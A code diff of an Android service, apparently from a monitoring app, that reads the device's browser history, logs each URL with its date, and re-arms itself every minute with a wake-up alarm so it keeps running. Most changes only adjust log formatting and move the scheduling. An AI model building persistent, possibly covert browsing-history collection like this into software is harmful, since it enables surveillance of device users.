@@ -24,7 +24,7 @@ import com.inet.android.bs.WorkTimeDefiner;
 
 public class LinkService extends Service {
 
-	private static final int SERVICE_REQUEST_CODE = 25;
+	private static final int SERVICE_REQUEST_CODE = 25; // уникальный int сервиса
 	final String LOG_TAG = "historyService";
 	SharedPreferences sPref;
 	final String SAVED_TIME = "saved_time";
@@ -45,42 +45,41 @@ public class LinkService extends Service {
 
 	public int onStartCommand(Intent intent, int flags, int startId) {
 		Log.d(LOG_TAG, "onStartCommand - " + sp.getString("ID", "ID"));
+		FileLog.writeLog(LOG_TAG + " -> onStartCommand - " + sp.getString("ID", "ID"));
+		
 		sp = PreferenceManager.getDefaultSharedPreferences(this);
 		String linkEnd = sp.getString("ACTION", "OK");
 
 		if (linkEnd.equals("REMOVE")) {
 			Log.d(LOG_TAG, "REMOVE");
-			FileLog.writeLog("historyService: REMOVE");
+			FileLog.writeLog("historyService -> REMOVE");
 			
 			return 0;
 		}
 		
-		// запрос каждые 4 часа
-				
-		boolean isWork = WorkTimeDefiner.isDoWork(getApplicationContext());
-		if (!isWork) {
-			Log.d(LOG_TAG, "isDoWork return " + Boolean.toString(isWork));
-			FileLog.writeLog("historyService: isWork return " + Boolean.toString(isWork));
-			
-			return Service.START_STICKY;
-		} else {
-			Log.d(LOG_TAG, "isDoWork return " + Boolean.toString(isWork));
-			FileLog.writeLog("historyService: isDoWork return " + Boolean.toString(isWork));
-		}
-		
-		linkTask(); // просомотр истории браузера
-
 		Calendar cal = Calendar.getInstance();
 		cal.add(Calendar.MINUTE, 1);// через 1 минут
 
 		PendingIntent servicePendingIntent = PendingIntent.getService(this,
-				SERVICE_REQUEST_CODE, new Intent(this, LinkService.class),// SERVICE_REQUEST_CODE - уникальный int сервиса
+				SERVICE_REQUEST_CODE, new Intent(this, LinkService.class),
 				PendingIntent.FLAG_UPDATE_CURRENT);
 
 		AlarmManager am = (AlarmManager) getSystemService(ALARM_SERVICE);
 		am.set(AlarmManager.RTC_WAKEUP, cal.getTimeInMillis(),
 				servicePendingIntent);
+				
+		boolean isWork = WorkTimeDefiner.isDoWork(getApplicationContext());
+		if (!isWork) {
+			Log.d(LOG_TAG, "isDoWork return " + Boolean.toString(isWork));
+			FileLog.writeLog("historyService -> isWork return " + Boolean.toString(isWork));
+			
+			return Service.START_STICKY;
+		} else {
+			Log.d(LOG_TAG, "isDoWork return " + Boolean.toString(isWork));
+			FileLog.writeLog("historyService -> isDoWork return " + Boolean.toString(isWork));
+		}
 		
+		linkTask(); // просомотр истории браузера
 		
 		super.onStartCommand(intent, flags, startId);
 		return Service.START_STICKY;
@@ -90,12 +89,12 @@ public class LinkService extends Service {
 		super.onDestroy();
 		
 		Log.d(LOG_TAG, "onDestroy");
-		FileLog.writeLog("historyService: onDestroy");
+		FileLog.writeLog("historyService -> onDestroy");
 	}
 
 	public IBinder onBind(Intent intent) {
 		Log.d(LOG_TAG, "onBind");
-		FileLog.writeLog("historyService: onBind");
+		FileLog.writeLog("historyService -> onBind");
 		
 		return null;
 	}
@@ -111,7 +110,7 @@ public class LinkService extends Service {
 				sel, null, null);
 		mCur.moveToFirst();
 		
-		sPref = PreferenceManager.getDefaultSharedPreferences(context);// getPreferences(MODE_PRIVATE);
+		sPref = PreferenceManager.getDefaultSharedPreferences(context);
 
 		String title = "";
 		String url = "";
@@ -142,7 +141,7 @@ public class LinkService extends Service {
 
 					Log.d(LOG_TAG, "--- "
 							+ formatter.format(calendar.getTime()).toString());
-					FileLog.writeLog("historyService: --- "
+					FileLog.writeLog("historyService -> "
 							+ formatter.format(calendar.getTime()).toString());
 
 					// Create a calendar object that will convert the date and
@@ -171,7 +170,7 @@ public class LinkService extends Service {
 					
 					Log.d(LOG_TAG, formatter.format(calendar.getTime())
 							.toString() + " - " + url);
-					FileLog.writeLog("historyService: --- "
+					FileLog.writeLog("historyService ->  "
 							+ formatter.format(calendar.getTime()).toString() + " - " + url);
 				}
 				mCur.moveToNext();
